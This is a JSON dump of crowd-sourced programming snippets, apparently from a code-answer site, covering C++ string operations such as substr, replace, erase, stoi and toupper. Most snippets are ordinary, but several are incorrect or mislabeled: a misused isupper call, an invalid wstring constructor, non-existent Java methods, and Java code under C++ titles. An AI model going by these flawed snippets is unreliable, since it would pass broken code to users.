\t//\"Ever thing inside these double quotes becomes const char array\"    //std::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl; //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;     std::cin.get();  }\n// string::operator[] #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   for (int i=0; i<str.length(); ++i)   {     std::cout << str[i];   }   return 0; }\n#include <string> std::begin\t\t| returns an iterator to the beginning of a container  std::end\t\t| returns an iterator to the end of a container  std::size\t\t| returns the length of string std::to_string\t| converts a number to string std::stoi\t\t| converts a string to a signed integer std::getline \t| read data from an I/O stream into a string std::swap  \t\t| specializes the std::swap algorithm std::empty \t\t| checks whether the container is empty\n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3857,
    "keyword": null,
    "link": null,
    "title": " string c++ if letter is lowercase",
    "description": "for(int i=0;i<str.size();i++){ int c = str[i];          if (islower(c))               str[i] = toupper(c); }\nstr[i] = toupper(str[i]);\nif (isupper(str[i])) { \t// str[i] is uppercase }\nchar test='a'; cout<<isalpha(test);\n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3858,
    "keyword": null,
    "link": null,
    "title": " string c++ if letter or number",
    "description": "#include<stdio.h> #include<ctype.h>  int main() {    char val1 = 's';    char val2 = '8';     if(isalpha(val1))    printf(\"The character is an alphabet\\n\");    else    printf(\"The character is not an alphabet\\n\");     if(isalpha(val2))    printf(\"The character is an alphabet\\n\");    else    printf(\"The character is not an alphabet\");     return 0; }\n#include<stdio.h> #include<ctype.h>  int main() {    char val1 = 's';    char val2 = '8';     if(isdigit(val1))    printf(\"The character is a digit\\n\");    else    printf(\"The character is not a digit\\n\");     if(isdigit(val2))    printf(\"The character is a digit\\n\");    else    printf(\"The character is not a digit\");     return 0; }\nchar test='a'; cout<<isalpha(test);\n",
    "reg_date": "2021-10-12T11:43:39.000Z"
  },
  {
    "id": 3859,
    "keyword": null,
    "link": null,
    "title": " string c++ replace",
    "description": "#include <cassert> #include <cstddef> #include <iostream> #include <string> #include <string_view>   std::size_t replace_all(std::string& inout, std::string_view what, std::string_view with); std::size_t remove_all(std::string& inout, std::string_view what); void test_replace_remove_all();   int main() {     std::string str{\"The quick brown fox jumps over the lazy dog.\"};       str.replace(10, 5, \"red\"); // (5)       str.replace(str.begin(), str.begin() + 3, 1, 'A'); // (6)       std::cout << str << \"\\n\\n\";       test_replace_remove_all(); }     std::size_t replace_all(std::string& inout, std::string_view what, std::string_view with) {     std::size_t count{};     for (std::string::size_type pos{};          inout.npos != (pos = inout.find(what.data(), pos, what.length()));          pos += with.length(), ++count) {         inout.replace(pos, what.length(), with.data(), with.length());     }     return count; }   std::size_t remove_all(std::string& inout, std::string_view what) {     return replace_all(inout, what, \"\"); }   void test_replace_remove_all() {     std::string str2{\"ftp: ftpftp: ftp:\"};     std::cout << \"#1 \" << str2 << '\\n';       auto count = replace_all(str2, \"ftp\", \"http\");     assert(count == 4);     std::cout << \"#2 \" << str2 << '\\n';       count = replace_all(str2, \"ftp\", \"http\");     assert(count == 0);     std::cout << \"#3 \" << str2 << '\\n';       count = remove_all(str2, \"http\");     assert(count == 4);     std::cout << \"#4 \" << str2 << '\\n'; }\n",
    "reg_date": "2021-10-12T11:43:39.000Z"
  },
  {
    "id": 3860,
    "keyword": null,
    "link": null,
    "title": " string c++ substr",
    "description": "s.substr(pos,len);\n#include <string> #include <iostream>   int main() {     std::string a = \"0123456789abcdefghij\";       // count is npos, returns [pos, size())     std::string sub1 = a.substr(10);     std::cout << sub1 << '\\n';       // both pos and pos+count are within bounds, returns [pos, pos+count)     std::string sub2 = a.substr(5, 3);     std::cout << sub2 << '\\n';       // pos is within bounds, pos+count is not, returns [pos, size())      std::string sub4 = a.substr(a.size()-3, 50);     // this is effectively equivalent to     // std::string sub4 = a.substr(17, 3);     // since a.size() == 20, pos == a.size()-3 == 17, and a.size()-pos == 3       std::cout << sub4 << '\\n';       try {         // pos is out of bounds, throws         std::string sub5 = a.substr(a.size()+3, 50);         std::cout << sub5 << '\\n';     } catch(const std::out_of_range& e) {         std::cout << \"pos exceeds string size\\n\";     } }\n",
    "reg_date": "2021-10-12T11:43:39.000Z"
  },
  {
    "id": 3861,
    "keyword": null,
    "link": null,
    "title": " string copy in cpp",
    "description": "//use '=' to copy string string s1={\"Hello\"}; string s2; s2=s1;\t//now s2 will have a copu s1\n",
    "reg_date": "2021-10-12T11:43:39.000Z"
  },
  {
    "id": 3862,
    "keyword": null,
    "link": null,
    "title": " string count occurrences c++",
    "description": "std::string s = \"a_b_c\"; size_t n = std::count(s.begin(), s.end(), '_'); // n=2\n#include <algorithm>  std::string s = \"a_b_c\"; size_t n = std::count(s.begin(), s.end(), '_'); //n=2 \n",
    "reg_date": "2021-10-12T11:43:39.000Z"
  },
  {
    "id": 3863,
    "keyword": null,
    "link": null,
    "title": " string erase character c++",
    "description": "#include<iostream> #include<algorithm>  using namespace std; main() {    string my_str = \"ABAABACCABA\";     cout << \"Initial string: \" << my_str << endl;     my_str.erase(remove(my_str.begin(), my_str.end(), 'A'), my_str.end()); //remove A from string    cout << \"Final string: \" << my_str; }\n#include <iostream> #include <algorithm> #include <string>   int main() {     std::string s = \"This is an example\";     std::cout << s << '\\n';       s.erase(0, 5); // Erase \"This \"     std::cout << s << '\\n';       s.erase(std::find(s.begin(), s.end(), ' ')); // Erase ' '     std::cout << s << '\\n';       s.erase(s.find(' ')); // Trim from ' ' to the end of the string     std::cout << s << '\\n'; }\n string& erase (size_t pos = 0, size_t len = npos); /* pos Position of the first character to be erased. If this is greater than the string length, it throws out_of_range. Note: The first character in str is denoted by a value of 0 (not 1). len Number of characters to erase (if the string is shorter, as many characters as possible are erased). A value of string::npos indicates all characters until the end of the string. */\n",
    "reg_date": "2021-10-12T11:43:39.000Z"
  },
  {
    "id": 3864,
    "keyword": null,
    "link": null,
    "title": " string get full cin",
    "description": "// use std::getline( std::cin, your string ), from <string> // extract to string #include <iostream> #include <string>  int main () {   std::string name;    std::cout << \"Please, enter your full name: \";   std::getline (std::cin,name);   std::cout << \"Hello, \" << name << \"!\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:43:39.000Z"
  },
  {
    "id": 3865,
    "keyword": null,
    "link": null,
    "title": " string hash",
    "description": "long long compute_hash(string const& s) {     const int p = 53;     const int m = 1e9 + 9;     long long hash_value = 0;     long long p_pow = 1;     for (char c : s) {         hash_value = (hash_value + (c - 'a' + 1) * p_pow) % m;         p_pow = (p_pow * p) % m;     }     return hash_value; } \n",
    "reg_date": "2021-10-12T11:43:39.000Z"
  },
  {
    "id": 3866,
    "keyword": null,
    "link": null,
    "title": " string hex to int c++",
    "description": "//C++11 std::string s = \"0xfffefffe\"; unsigned int x = std::stoul(s, nullptr, 16); \n",
    "reg_date": "2021-10-12T11:43:39.000Z"
  },
  {
    "id": 3867,
    "keyword": null,
    "link": null,
    "title": " string in c++",
    "description": "// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \n// Include the string library #include <string>  // Create a string variable string greeting = \"Hello\";\n#include <string> string hello= \"hello you thre :)\";\n#include <iostream> #include <string>//for printing std::string int main()  { \t//A string is a group of characters and an array of const chars \tconst char* name = \"Caleb\";//C style string \t//how string actually works below: \t//String without null terminating character below:  \tchar name2[5] = { 'C','a','l','e','b' };// string is just an array of characters \t//The above doesn't have an null termination character at the end cout will not now where the string ends and will acess memory that is not a part of your string \tstd::cout << name2 << std::endl;//output => Caleb + somejunk //this is because null terminating char is not present at the end of array \t//String with null terminating character below:  \tchar name3[6] = { 'C','a','l','e','b','\\0' };//null terminating char '\\0' or '0' can be used  \tstd::cout << name3 << std::endl;//output => Caleb // because null terminating char is present cout knows where array ends   \t//std::string class in c++ is takes an array of const chars and a bunch of functions to manuplate it: \t//std::string has a constructor  that takes const char array \tstd::string name4 = \"Caleb\"; \tname4.size();//gives size of string and there are many more methods in std::string class \t   //appending to std::string      \t//\"Ever thing inside these double quotes becomes const char array\"    //std::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl; //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;     std::cin.get();  }\n#include <stdio.h> int main() {     char name[30];     printf(\"Enter name: \");     fgets(name, sizeof(name), stdin);  // read string     printf(\"Name: \");     puts(name);    // display string     return 0; } \n#include <string>  std::string myString = \"Hello, World!\";\n",
    "reg_date": "2021-10-12T11:43:40.000Z"
  },
  {
    "id": 3868,
    "keyword": null,
    "link": null,
    "title": " string in cpp",
    "description": "// Include the string library #include <string>  // Create a string variable string greeting = \"Hello\";\n#include <string> string hello= \"hello you thre :)\";\n#include <iostream> #include <string>//for printing std::string int main()  { \t//A string is a group of characters and an array of const chars \tconst char* name = \"Caleb\";//C style string \t//how string actually works below: \t//String without null terminating character below:  \tchar name2[5] = { 'C','a','l','e','b' };// string is just an array of characters \t//The above doesn't have an null termination character at the end cout will not now where the string ends and will acess memory that is not a part of your string \tstd::cout << name2 << std::endl;//output => Caleb + somejunk //this is because null terminating char is not present at the end of array \t//String with null terminating character below:  \tchar name3[6] = { 'C','a','l','e','b','\\0' };//null terminating char '\\0' or '0' can be used  \tstd::cout << name3 << std::endl;//output => Caleb // because null terminating char is present cout knows where array ends   \t//std::string class in c++ is takes an array of const chars and a bunch of functions to manuplate it: \t//std::string has a constructor  that takes const char array \tstd::string name4 = \"Caleb\"; \tname4.size();//gives size of string and there are many more methods in std::string class \t   //appending to std::string      \t//\"Ever thing inside these double quotes becomes const char array\"    //std::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl; //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;     std::cin.get();  }\n#include <string>  std::string myString = \"Hello, World!\";\n#include <string> #include <iostream> #include <type_traits> #include <cstring>  int main() {   std::string str = \"Hello, there\";   std::cout << std::boolalpha   << str.capacity() << \", \" << str.size() << \", \" << std::strlen(str.data()) // 12, 12, 12   << '\\n' << std::is_same_v<std::string, std::basic_string<char>> // true   << '\\n' << str.front() + str.substr(1, 10) + str.back() // Hello there   << '\\n' << str[0] // H   << '\\n';      str += \"!\";    std::cout << str << '\\n'; // Hello, there!   str.erase(4, 4); // Hellhere!   str.pop_back(); // Hellhere   str.insert(4, \" \"); // Hell here   std::cout << str << '\\n'; // Hell here    }\n// you want to include <string> #include <string> #include <iostream>  int main()  {   string helloWorld = \"Hello World!\"; // creating string and assigning   std::cout << helloWorld;            // will output what you assigned it!                                       /* you can also use strings with user                                        input (cin/getline)*/   string namePerson{};   getline(cin, namePerson); // getline allows for multi word input   std::cout << namePerson;  // outputs name which person inputted }\n",
    "reg_date": "2021-10-12T11:43:40.000Z"
  },
  {
    "id": 3869,
    "keyword": null,
    "link": null,
    "title": " string inpurt in c++",
    "description": "   string fullName; cout << \"Type your full name: \";     getline (cin, fullName); cout << \"Your name is: \" <<    fullName;  // Type your full name: John Doe // Your name is: John Doe \n",
    "reg_date": "2021-10-12T11:43:40.000Z"
  },
  {
    "id": 3870,
    "keyword": null,
    "link": null,
    "title": " string input with space c++ stl",
    "description": "char input[100]; cin.getline(input,sizeof(input)); \n",
    "reg_date": "2021-10-12T11:43:40.000Z"
  },
  {
    "id": 3871,
    "keyword": null,
    "link": null,
    "title": " string insert c++",
    "description": "// appending to string #include <iostream> #include <string>  int main () {   std::string str;   std::string str2=\"Writing \";   std::string str3=\"print 10 and then 5 more\";    // used in the same order as described above:   str.append(str2);                       // \"Writing \"   str.append(str3,6,3);                   // \"10 \"   str.append(\"dots are cool\",5);          // \"dots \"   str.append(\"here: \");                   // \"here: \"   str.append(10u,'.');                    // \"..........\"   str.append(str3.begin()+8,str3.end());  // \" and then 5 more\"   str.append<int>(5,0x2E);                // \".....\"    std::cout << str << '\\n';   return 0; }\n// inserting into a string #include <iostream> #include <string>  int main () {   std::string str=\"to be question\";   std::string str2=\"the \";   std::string str3=\"or not to be\";   std::string::iterator it;    // used in the same order as described above:   str.insert(6,str2);                 // to be (the )question   str.insert(6,str3,3,4);             // to be (not )the question   str.insert(10,\"that is cool\",8);    // to be not (that is )the question   str.insert(10,\"to be \");            // to be not (to be )that is the question   str.insert(15,1,':');               // to be not to be(:) that is the question   it = str.insert(str.begin()+5,','); // to be(,) not to be: that is the question   str.insert (str.end(),3,'.');       // to be, not to be: that is the question(...)   str.insert (it+2,str3.begin(),str3.begin()+3); // (or )    std::cout << str << '\\n';   return 0; }\n#include<iostream> #include <string> int main() { \t//\"Ever thing inside these double quotes becomes const char array\" //\tstd::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl;// output=>Caleb Hello //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;// output=>Caleb Hello \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:43:40.000Z"
  },
  {
    "id": 3872,
    "keyword": null,
    "link": null,
    "title": " string iterator in c++",
    "description": "#include<iostream> using namespace std; main() {    string my_str = \"Hello World\";    for(int i = 0; i<my_str.length(); i++) {       cout << my_str.at(i) << endl; //get character at position i    } }\nstd::string s(\"Hello world\");  for (char & c : s) {     std::cout << \"One character: \" << c << \"\\n\";     c = '*'; } \n// string::begin/end #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   for ( std::string::iterator it=str.begin(); it!=str.end(); ++it)     std::cout << *it << endl;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:40.000Z"
  },
  {
    "id": 3873,
    "keyword": null,
    "link": null,
    "title": " string length c++",
    "description": "// string::length #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   std::cout << \"The size of str is \" << str.length() << \" bytes.\\n\";   return 0; }\nstr.length();\n#include <iostream> #include <string>  int main() {   string str = \"iftee\";      //method 1: using length() function   int len = str.length();   cout << \"The String Length: \" << len << endl;      //method 2: using size() function   int len2 = str.size();   cout << \"The String Length: \" << len2 << endl;      return 0; }\n#include <string> #include <iostream>  int main() {     std::string s(21, '*');      std::cout << s << std::endl;      return 0; } \nstring str =\"hello world\";  //different ways to find length of a string:  str.length();  str.size();  \n   string txt = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; cout << \"The length of the txt    string is: \" << txt.length();     //Tip: You might see some C++ programs that use the size() function to get the length of a string. This is just an alias of length().  //It is completely up to you if you want to use length() or size():      string txt = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; cout << \"The length of the txt string is: \" << txt.size();\n",
    "reg_date": "2021-10-12T11:43:40.000Z"
  },
  {
    "id": 3874,
    "keyword": null,
    "link": null,
    "title": " string literal c++",
    "description": "#include <iostream> #include <string> #include <stdlib.h>// using c standard library int main() {  \t\"Caleb\";//String literal is a series of characters between two double quotes \t//It is a const char array and array is  just a ptr to a begining of block of memory \t//String literals are stored in read only section of memory  \tconst char name[8] = \"Rhe\\0eno\";// \\0 is null termination character \tstd::cout << strlen(name) << std::endl;//c function for size of string ,output => 3 due to null terminating char \\0 \tstd::cout << name << std::endl;// output => Rhe because null termination char \\0  \tconst char* name1 = u8\"Caleb\";//1 byte per char \tconst wchar_t* name2 = L\"Caleb\";//is 2 or 4 bytes per character dependent on compile on windows it's usually 2bytes but on linux it is 4 bytes per char \tconst char16_t* name3 = u\"Caleb\";//2 byte per char \tconst char32_t* name4 = U\"Caleb\";//4 byte per char   \tusing namespace std::string_literals; \t// this name space give   number of functions for convenience  \t//std::string name0 = \"Caleb\" + \"hello\";//error because can't add ptr to ptr \tstd::string name0 = \"Caleb\"s + \"hello\";//s is an operator that returns std::string this will work because now adding a ptr to actual string \t//various versions of strings \tstd::wstring namee = L\"Caleb\"s + L\"hello\";//wide string: 2 or 4 bytes depend on compiler \tstd::u32string namee32 = U\"Caleb\"s + U\"hello\";//u 32 string :4 bytes per char \tstd::u16string namee16 = u\"Caleb\"s + u\"hello\";//u16 string :2bytes per char \tstd::string namee8 = u8\"Caleb\";//1 byte per character \tconst char* example = R\"(Line1 Line 2 Line 3  Line 4  )\";//R:Raw  for writing on different lines it prints escape characters  \tstd::cin.get();  };\n//EXAMPLE std::string sRaw = R\"(aaa\\ttt %)\";     //   aaa/ttt % std::string sNonRaw = \"aaa\\ttt %\";   //     aaa     tt % std::cout << sRaw << \"\\n\"; std::cout << sNonRaw << \"\\n\";  //SYNTAX // R\"(<string-with-raw-values>)\" // R\"(...)\"\nstring literal\n",
    "reg_date": "2021-10-12T11:43:40.000Z"
  },
  {
    "id": 3875,
    "keyword": null,
    "link": null,
    "title": " string literals in c++",
    "description": "#include <iostream> #include <string> #include <stdlib.h>// using c standard library int main() {  \t\"Caleb\";//String literal is a series of characters between two double quotes \t//It is a const char array and array is  just a ptr to a begining of block of memory \t//String literals are stored in read only section of memory  \tconst char name[8] = \"Rhe\\0eno\";// \\0 is null termination character \tstd::cout << strlen(name) << std::endl;//c function for size of string ,output => 3 due to null terminating char \\0 \tstd::cout << name << std::endl;// output => Rhe because null termination char \\0  \tconst char* name1 = u8\"Caleb\";//1 byte per char \tconst wchar_t* name2 = L\"Caleb\";//is 2 or 4 bytes per character dependent on compile on windows it's usually 2bytes but on linux it is 4 bytes per char \tconst char16_t* name3 = u\"Caleb\";//2 byte per char \tconst char32_t* name4 = U\"Caleb\";//4 byte per char   \tusing namespace std::string_literals; \t// this name space give   number of functions for convenience  \t//std::string name0 = \"Caleb\" + \"hello\";//error because can't add ptr to ptr \tstd::string name0 = \"Caleb\"s + \"hello\";//s is an operator that returns std::string this will work because now adding a ptr to actual string \t//various versions of strings \tstd::wstring namee = L\"Caleb\"s + L\"hello\";//wide string: 2 or 4 bytes depend on compiler \tstd::u32string namee32 = U\"Caleb\"s + U\"hello\";//u 32 string :4 bytes per char \tstd::u16string namee16 = u\"Caleb\"s + u\"hello\";//u16 string :2bytes per char \tstd::string namee8 = u8\"Caleb\";//1 byte per character \tconst char* example = R\"(Line1 Line 2 Line 3  Line 4  )\";//R:Raw  for writing on different lines it prints escape characters  \tstd::cin.get();  };\nstring literal\n",
    "reg_date": "2021-10-12T11:43:40.000Z"
  },
  {
    "id": 3876,
    "keyword": null,
    "link": null,
    "title": " string reverse iterator c++",
    "description": "// string::rbegin/rend #include <iostream> #include <string>  int main () {   std::string str (\"now step live...\");   for (std::string::reverse_iterator rit=str.rbegin(); rit!=str.rend(); ++rit)     std::cout << *rit;   return 0; }\n...evil pets won \n",
    "reg_date": "2021-10-12T11:43:41.000Z"
  },
  {
    "id": 3877,
    "keyword": null,
    "link": null,
    "title": " string reverse stl",
    "description": "int main() {      string str = \"foobarbaz\";     reverse(str.begin(), str.end());      cout << str; // prints \"zabraboof\"     return 0;  } \n",
    "reg_date": "2021-10-12T11:43:41.000Z"
  },
  {
    "id": 3878,
    "keyword": null,
    "link": null,
    "title": " string split by space c++",
    "description": "std::vector<std::string> string_split(const std::string& str) { \tstd::vector<std::string> result; \tstd::istringstream iss(str); \tfor (std::string s; iss >> s; ) \t\tresult.push_back(s); \treturn result; }\n// Extract the first token char * token = strtok(string, \" \"); // loop through the string to extract all other tokens while( token != NULL ) {   printf( \" %s\\n\", token ); //printing each token   token = strtok(NULL, \" \"); } return 0;\n",
    "reg_date": "2021-10-12T11:43:41.000Z"
  },
  {
    "id": 3879,
    "keyword": null,
    "link": null,
    "title": " string substr c++",
    "description": "s.substr(pos,len);\n// string::substr #include <iostream> #include <string>  int main () {   std::string str=\"We think in generalities, but we live in details.\";                                            // (quoting Alfred N. Whitehead)    std::string str2 = str.substr (3,5);     // \"think\"    std::size_t pos = str.find(\"live\");      // position of \"live\" in str    std::string str3 = str.substr (pos);     // get from \"live\" to the end    std::cout << str2 << ' ' << str3 << '\\n';    return 0; }\n#include <string> #include <iostream>   int main() {     std::string a = \"0123456789abcdefghij\";       // count is npos, returns [pos, size())     std::string sub1 = a.substr(10);     std::cout << sub1 << '\\n';       // both pos and pos+count are within bounds, returns [pos, pos+count)     std::string sub2 = a.substr(5, 3);     std::cout << sub2 << '\\n';       // pos is within bounds, pos+count is not, returns [pos, size())      std::string sub4 = a.substr(a.size()-3, 50);     // this is effectively equivalent to     // std::string sub4 = a.substr(17, 3);     // since a.size() == 20, pos == a.size()-3 == 17, and a.size()-pos == 3       std::cout << sub4 << '\\n';       try {         // pos is out of bounds, throws         std::string sub5 = a.substr(a.size()+3, 50);         std::cout << sub5 << '\\n';     } catch(const std::out_of_range& e) {         std::cout << \"pos exceeds string size\\n\";     } }\n",
    "reg_date": "2021-10-12T11:43:41.000Z"
  },
  {
    "id": 3880,
    "keyword": null,
    "link": null,
    "title": " string to char*",
    "description": "// \"std::string\" has a method called \"c_str()\" that returns a \"const char*\" // pointer to its inner memory. You can copy that \"const char*\" to a variable // using \"strcpy()\".  std::string str = \"Hello World\"; char buffer[50];  strcpy(buffer, str.c_str());  std::cout << buffer;\t//Output: Hello World  //POSTED BY eferion ON STACK OVERFLOW (IN SPANISH). \nstd::string str = \"string\"; const char *cstr = str.c_str(); \nString string =  \"ABCDEF\" ;   char[] charsFromString = string.toCharArray(); // { 'A', 'B', 'C', 'D', 'E', 'F' }\n// getting single character from string.. String str=\"abcd\";  char c=str.toChar(0);   System.out.println(\"output is \"+c); // output is a\nString s = \"a\"; char c = s.charAt(\"0\");\nchar c; char *pChar = &c; \n",
    "reg_date": "2021-10-12T11:43:41.000Z"
  },
  {
    "id": 3881,
    "keyword": null,
    "link": null,
    "title": " string to char array c++",
    "description": "std::string myWord = \"myWord\"; char myArray[myWord.size()+1];//as 1 char space for null is also required strcpy(myArray, myWord.c_str());\nconst char *array = tmp.c_str(); //For const char array char *array = &tmp[0]; // If you need to modify the array\n",
    "reg_date": "2021-10-12T11:43:41.000Z"
  },
  {
    "id": 3882,
    "keyword": null,
    "link": null,
    "title": " string to int c++",
    "description": "#include <iostream> #include <string>  int main() {      std::string str = \"123\";     int num;      // using stoi() to store the value of str1 to x     num = std::stoi(str);      std::cout << num;      return 0; }\nint thing = std::stoi(string);\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \n#include <iostream> #include <string> using namespace std; int main() {       string s = \"10\";       try     {         int i = stoi(s);         cout << i << '\\n';     }     catch (invalid_argument const &e)     {         cout << \"Bad input: std::invalid_argument thrown\" << '\\n';     }     catch (out_of_range const &e)     {         cout << \"Integer overflow: std::out_of_range thrown\" << '\\n';     }       return 0; }\n// Both functions work identically though you'll need to use \"#include <string>\"  atoi( str.c_str() ); stoi( str );\n// stoi example #include <iostream>   // std::cout #include <string>     // std::string, std::stoi  int main () {   std::string str_dec = \"2001, A Space Odyssey\";   std::string str_hex = \"40c3\";   std::string str_bin = \"-10010110001\";   std::string str_auto = \"0x7f\";    std::string::size_type sz;   // alias of size_t    int i_dec = std::stoi (str_dec,&sz);   int i_hex = std::stoi (str_hex,nullptr,16);   int i_bin = std::stoi (str_bin,nullptr,2);   int i_auto = std::stoi (str_auto,nullptr,0);    std::cout << str_dec << \": \" << i_dec << \" and [\" << str_dec.substr(sz) << \"]\\n\";   std::cout << str_hex << \": \" << i_hex << '\\n';   std::cout << str_bin << \": \" << i_bin << '\\n';   std::cout << str_auto << \": \" << i_auto << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:41.000Z"
  },
  {
    "id": 3883,
    "keyword": null,
    "link": null,
    "title": " string to int in c++",
    "description": "#include <iostream> #include <string>  int main() {      std::string str = \"123\";     int num;      // using stoi() to store the value of str1 to x     num = std::stoi(str);      std::cout << num;      return 0; }\nint thing = std::stoi(string);\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \n#include <iostream> #include <string> using namespace std; int main() {       string s = \"10\";       try     {         int i = stoi(s);         cout << i << '\\n';     }     catch (invalid_argument const &e)     {         cout << \"Bad input: std::invalid_argument thrown\" << '\\n';     }     catch (out_of_range const &e)     {         cout << \"Integer overflow: std::out_of_range thrown\" << '\\n';     }       return 0; }\natoi( str.c_str() )\n// Both functions work identically though you'll need to use \"#include <string>\"  atoi( str.c_str() ); stoi( str );\n",
    "reg_date": "2021-10-12T11:43:42.000Z"
  },
  {
    "id": 3884,
    "keyword": null,
    "link": null,
    "title": " string to long c++",
    "description": "//stol(string , nullptr,  base);  string str = \"100\"; long int num = stol(str, nullptr,  10); cout << num << std;//output 100  //Base goes over ten with letters: string str = \"F\"; long int num = stol(str, nullptr,  16); cout << num << std;//output 15\n",
    "reg_date": "2021-10-12T11:43:42.000Z"
  },
  {
    "id": 3885,
    "keyword": null,
    "link": null,
    "title": " string to number in c++",
    "description": "#include <iostream> #include <string>  int main() {      std::string str = \"123\";     int num;      // using stoi() to store the value of str1 to x     num = std::stoi(str);      std::cout << num;      return 0; }\nint thing = std::stoi(string);\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \natoi( str.c_str() )\n#include<string> string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";  int myint1 = stoi(str1); std::cout<<stoi(str1);\nstring s = \"123\"; int n = s.size(); int num = 0;  for(int i = 0 ; i<n;i++)//this what stoi built function do XD  {   num = num*10+(s[i]-'0');  }\n",
    "reg_date": "2021-10-12T11:43:42.000Z"
  },
  {
    "id": 3886,
    "keyword": null,
    "link": null,
    "title": " string to upper c++",
    "description": "transform(str.begin(), str.end(), str.begin(), ::toupper); \n#include<bits/stdc++.h>  using namespace std;     int main()  {      string s = \"Viet Nam\";      transform(s.begin(), s.end(), s.begin(), ::toupper);  //uppercase     cout << s << endl;      return 0;  } \nstd::string data = \"This is a sample string.\"; // convert string to upper case std::for_each(data.begin(), data.end(), [](char & c){ c = ::toupper(c); });\n#include <iostream> #include <string> using namespace std;  int main() {     char letter;      cout << \"You will be asked to enter a character.\";     cout << \"\\nIf it is a lowercase character, it will be converted to uppercase.\";     cout << \"\\n\\nEnter a character. Press . to stop: \";      cin >> letter;      if(islower(letter))     {         letter = isupper(letter);         cout << letter;     }      while(letter != '.')     {         cout << \"\\n\\nEnter a character. Press . to stop: \";         cin >> letter;          if(islower(letter))         {             letter = toupper(letter);             cout << letter;         }     }      return 0; } \n#include <cctype> #include <iostream> #include <cstring> #include <cstdio>  using namespace std;  int main() {     char str[] = \"John is from USA.\";      cout << \"The uppercase version of \\\"\" << str << \"\\\" is \" << endl;      for (int i=0; i<strlen(str); i++)         putchar(toupper(str[i]));          return 0; }\n",
    "reg_date": "2021-10-12T11:43:42.000Z"
  },
  {
    "id": 3887,
    "keyword": null,
    "link": null,
    "title": " string to vector c++",
    "description": "#include <iostream> #include <string> #include <vector>   int main() {     std::string s = \"Hello World!\";       std::vector<char> v(s.begin(), s.end());       for (const char &c: v)         std::cout << c;       return 0; } \n",
    "reg_date": "2021-10-12T11:43:42.000Z"
  },
  {
    "id": 3888,
    "keyword": null,
    "link": null,
    "title": " string to wstring",
    "description": "#include <locale> #include <codecvt> #include <string>  std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter; std::string narrow = converter.to_bytes(wide_utf16_source_string); std::wstring wide = converter.from_bytes(narrow_utf8_source_string); \n",
    "reg_date": "2021-10-12T11:43:42.000Z"
  },
  {
    "id": 3889,
    "keyword": null,
    "link": null,
    "title": " string to wstring conversion c++",
    "description": "string str = DATA_DIR; std::wstring temp(L\"%s\",str);  \n",
    "reg_date": "2021-10-12T11:43:42.000Z"
  },
  {
    "id": 3890,
    "keyword": null,
    "link": null,
    "title": " stringstream in c++",
